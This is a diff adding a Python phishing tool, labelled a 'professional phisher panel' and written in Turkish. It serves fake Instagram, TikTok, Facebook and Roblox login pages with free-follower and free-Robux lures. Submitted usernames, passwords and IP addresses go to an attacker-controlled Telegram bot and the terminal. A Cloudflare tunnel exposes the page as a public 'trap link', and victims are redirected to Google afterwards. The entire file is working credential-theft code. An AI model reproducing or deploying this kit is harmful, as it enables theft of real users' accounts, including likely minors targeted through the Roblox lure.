@@ -1,0 +1,143 @@
+import os, time, subprocess, re, requests, threading
+from flask import Flask, render_template_string, request, redirect
+from colorama import Fore, Style, init
+
+# --- AYARLAR VE RENKLER ---
+init(autoreset=True)
+app = Flask(__name__)
+log_config = {}
+
+def banner():
+    os.system('clear')
+    # Terminaldeki "ATA" yazısı "OBANAI" olarak güncellendi
+    print(Fore.RED + Style.BRIGHT + r"""
+    #########################################################
+    #                                                       #
+    #   ██████╗ ██████╗  █████╗ ███╗   ██╗ █████╗ ██╗       #
+    #  ██╔═══██╗██╔══██╗██╔══██╗████╗  ██║██╔══██╗██║       #
+    #  ██║   ██║██████╔╝███████║██╔██╗ ██║███████║██║       #
+    #  ██║   ██║██╔══██╗██╔══██║██║╚██╗██║██╔══██║██║       #
+    #  ╚██████╔╝██████╔╝██║  ██║██║ ╚████║██║  ██║██║       #
+    #   ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝       #
+    #                                                       #
+    #            >> PROFESYONEL PHİSH3R PANEL <<            #
+    #########################################################
+    """)
+
+# --- LOG SEÇİM EKRANI ---
+def log_setup():
+    banner()
+    print(f"{Fore.CYAN}[?] Veri Sonuçları Nereye Gelsin?")
+    print(f"{Fore.YELLOW}[1] {Fore.WHITE}Telegram Bot (Otomatik)")
+    print(f"{Fore.YELLOW}[2] {Fore.WHITE}Termux Terminal (Uygulama)")
+
+    sec = input(f"\n{Fore.GREEN}Seçiminiz > {Fore.WHITE}")
+    if sec == "1":
+        token = input(f"{Fore.CYAN}Bot Token: {Fore.WHITE}")
+        cid = input(f"{Fore.CYAN}Chat ID: {Fore.WHITE}")
+        return {"mod": "telegram", "token": token, "id": cid}
+    else:
+        return {"mod": "termux"}
+
+# --- PROFESYONEL HTML TASARIMLARI ---
+def get_pro_html(platform):
+    if platform == "Roblox":
+        bg_color, accent, btn_color = "#191B1D", "#00B2FF", "#00B2FF"
+        title, desc = "ROBLOX - Promo Code Generator", "Hesabınıza 1000 Robux tanımlamak için giriş yapın."
+    elif platform == "Instagram":
+        bg_color, accent, btn_color = "#ffffff", "#E1306C", "#0095F6"
+        title, desc = "Instagram Takipçi Paneli", "Hediye 1000 takipçiyi almak için profilinizi onaylayın."
+    elif platform == "TikTok":
+        bg_color, accent, btn_color = "#ffffff", "#EE1D52", "#fe2c55"
+        title, desc = "TikTok Beğeni & İzlenme", "Keşfet etkili paketi tanımlamak için hesabınızı bağlayın."
+    else:
+        bg_color, accent, btn_color = "#f0f2f5", "#1877F2", "#1877F2"
+        title, desc = "Facebook Sayfa Yönetimi", "Sayfa etkileşimlerini artırmak için giriş yapın."
+
+    is_dark = "background-color: #191B1D; color: white;" if platform == "Roblox" else ""
+    container_dark = "background: #252729; border: none;" if platform == "Roblox" else ""
+
+    return f"""
+    <!DOCTYPE html>
+    <html lang="tr">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+        <title>{title}</title>
+        <style>
+            * {{ margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; }}
+            body {{ background-color: {bg_color}; display: flex; justify-content: center; align-items: center; height: 100vh; color: #262626; {is_dark} }}
+            .container {{ background: white; padding: 40px; border: 1px solid #dbdbdb; width: 100%; max-width: 350px; text-align: center; border-radius: 3px; {container_dark} }}
+            .logo {{ font-size: 28px; font-weight: bold; margin-bottom: 20px; color: {accent}; letter-spacing: -1px; }}
+            .info-text {{ font-size: 14px; color: #8e8e8e; margin-bottom: 20px; line-height: 1.4; }}
+            input {{ width: 100%; padding: 10px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 12px; outline: none; margin-bottom: 8px; }}
+            button {{ width: 100%; padding: 10px; background-color: {btn_color}; border: none; color: white; font-weight: 600; border-radius: 4px; cursor: pointer; margin-top: 10px; font-size: 14px; }}
+            .divider {{ display: flex; align-items: center; margin: 20px 0; }}
+            .divider::before, .divider::after {{ content: ""; flex: 1; height: 1px; background: #dbdbdb; }}
+            .divider span {{ padding: 0 10px; font-size: 12px; color: #8e8e8e; font-weight: 600; }}
+            .footer {{ margin-top: 20px; font-size: 12px; color: #8e8e8e; }}
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <div class="logo">{platform}</div>
+            <p class="info-text">{desc}</p>
+            <form action="/login" method="post">
+                <input type="text" name="user" placeholder="Kullanıcı adı veya e-posta" required>
+                <input type="password" name="pass" placeholder="Şifre" required>
+                <input type="hidden" name="platform" value="{platform}">
+                <button type="submit">Giriş Yap</button>
+            </form>
+            <div class="divider"><span>VEYA</span></div>
+            <div class="footer">© 2026 {platform} from Meta</div>
+        </div>
+    </body>
+    </html>
+    """
+
+# --- BACKEND İŞLEMLERİ ---
+current_plat = "Instagram"
+
+@app.route('/')
+def home():
+    return render_template_string(get_pro_html(current_plat))
+
+@app.route('/login', methods=['POST'])
+def login():
+    u, p, plat, ip = request.form.get('user'), request.form.get('pass'), request.form.get('platform'), request.remote_addr
+    if log_config["mod"] == "telegram":
+        msg = f"🎯 **HESAP DÜŞTÜ!**\n\n📌 P: {plat}\n👤 U: `{u}`\n🔑 P: `{p}`\n🌐 IP: {ip}"
+        requests.post(f"https://api.telegram.org/bot{log_config['token']}/sendMessage", data={"chat_id": log_config['id'], "text": msg, "parse_mode": "Markdown"})
+    
+    print(f"\n{Fore.RED}{'='*40}\n[!] YENİ LOG GELDİ\n{'-'*40}")
+    print(f"{Fore.YELLOW}Platform : {Fore.WHITE}{plat}\n{Fore.YELLOW}Kullanıcı: {Fore.CYAN}{u}\n{Fore.YELLOW}Şifre    : {Fore.CYAN}{p}\n{Fore.YELLOW}IP       : {Fore.WHITE}{ip}\n{Fore.RED}{'='*40}")
+    return redirect(f"https://www.google.com/search?q={plat}+login+success")
+
+# --- TÜNEL VE BAŞLATICI ---
+def start_t():
+    print(f"\n{Fore.CYAN}[*] Cloudflared tüneli kuruluyor...")
+    proc = subprocess.Popen(['cloudflared', 'tunnel', '--url', 'http://127.0.0.1:5000'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+    for line in proc.stdout:
+        if "trycloudflare.com" in line:
+            url = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", line)
+            if url:
+                print(f"\n{Fore.GREEN}[+] TUZAK LİNKİ: {Fore.YELLOW}{url.group(0)}")
+                break
+
+def main():
+    global log_config, current_plat
+    log_config = log_setup()
+    banner()
+    options = {"1": "Instagram", "2": "TikTok", "3": "Facebook", "4": "Roblox"}
+    for k, v in options.items(): print(f"{Fore.YELLOW}[{k}] {Fore.WHITE}{v} Paneli")
+    
+    sec = input(f"\n{Fore.GREEN}Hedef Seçin > {Fore.WHITE}")
+    current_plat = options.get(sec, "Instagram")
+    
+    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)).start()
+    time.sleep(2)
+    start_t()
+
+if __name__ == "__main__":
+    main()
+
